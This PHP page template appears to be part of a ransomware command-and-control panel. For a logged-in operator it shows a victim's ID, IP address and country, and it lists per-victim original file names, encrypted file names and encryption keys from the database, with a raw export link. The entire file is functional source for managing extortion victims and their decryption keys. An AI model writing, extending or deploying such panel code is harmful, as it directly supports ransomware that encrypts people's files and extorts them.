<?php include ROOT."content/theme/header.php"; ?>
	<?php if(isset($_SESSION['LOGIN'])){ ?>
		<?php 
		if(isset($_GET['page']) && ($_GET['page']=="victims") && (!empty($_GET['id']))){
			$db->go("SELECT * FROM victims WHERE id = '{$db->q($_GET['id']/1909)}' LIMIT 1");
			if($db->numRows()>0){
				$data = $db->fetchArray();
				?>
				<div class="wrapper">
					<div class="container">
						<div class="row">
							<div class="span12">
								<div class="content">

									<div class="module">
										<div class="module-head">
											<h3><i class="icon-user"></i> Victim Information</h3>
										</div>
										<div class="module-body">
											<form class="form-horizontal row-fluid">
												<div class="control-group">
													<label class="control-label" for="basicinput">Indentification ID</label>
													<div class="controls">
														<input  type="text" class="span4 tip" value="<?=$data['vid'];?>">
													</div>
												</div>
												<div class="control-group">
													<label class="control-label" for="basicinput">IP Address</label>
													<div class="controls">
														<input  type="text" class="span4 tip" value="<?=$data['ip'];?>">
													</div>
												</div>
												<div class="control-group">
													<label class="control-label" for="basicinput">Info</label>
													<div class="controls">
														<input  type="text" class="span8 tip" value="<?=$data['info'];?>">
													</div>
												</div>
												<div class="control-group">
													<label class="control-label" for="basicinput">Country</label>
													<div class="controls">
													<?php
													$country = $data['country'];
													if ($country == "") {
														$country = "XX";
													}
													?>
														<img src="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/images/flags/<?php echo$country;?>.gif"/>
													</div>
												</div>
											</form>
										</div>
									</div>
								<div class="module">
	                                <div class="module-head">
	                                    <h3><i class="icon-lock"></i> Victim Key List ( <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=raw&id=<?=$data['id']*1909;?>">RAW</a> )</h3>
	                                </div>
	                                <div class="module-body table">
	                                    <table cellpadding="0" cellspacing="0" border="0" class="datatable-1 table table-bordered table-striped	 display" width="100%" id="example">
	                                        <thead>
	                                            <tr>
	                                                <th width="50%">
	                                                    Original File
	                                                </th>
	                                                <th width="20%">
	                                                    Encrypted File
	                                                </th>
	                                                <th width="20%">
	                                                    Key
	                                                </th>
	                                                <th width="10%">
	                                                    <center>Date</center>
	                                                </th>
	                                            </tr>
	                                        </thead>
	                                        <tbody>
											<?php 
											$db->go("SELECT * FROM victim_keys WHERE vid = '".$data['vid']."' ORDER BY id DESC");
											while($row = $db->fetchArray()){
											?>
	                                            <tr class="">
	                                                <td>
	                                                    <?=base64_decode($row['original_file']);?>
	                                                </td>
	                                                <td>
		                                                <input  type="text" class="span3 tip" value="<?=base64_decode($row['encrypted_file']);?>">
	                                                </td>
	                                                <td>
		                                                <input  type="text" class="span3 tip" value="<?=base64_decode($row['encrypted_key']);?>">
	                                                </td>
	                                                <td class="center">
	                                                    <center><?=$row['date'];?></center>
	                                                </td>
	                                            </tr>    
											<?php 
												}
											?>
	                                        </tbody>
	                                    </table>
	                                </div>
	                            </div>
								</div>
							</div>
						</div>
					</div>
				</div>
									
		<?php	
			} else {
				$notice->addError("Data not found!");
				header("location:".$GLOBALS['_CONF']['HTTP'].$_GET['page']."/");
			}
		} 
	} else {
		header("location: ".$GLOBALS['_CONF']['HTTP']);
	} ?>
<?php include ROOT."content/theme/footer.php"; ?>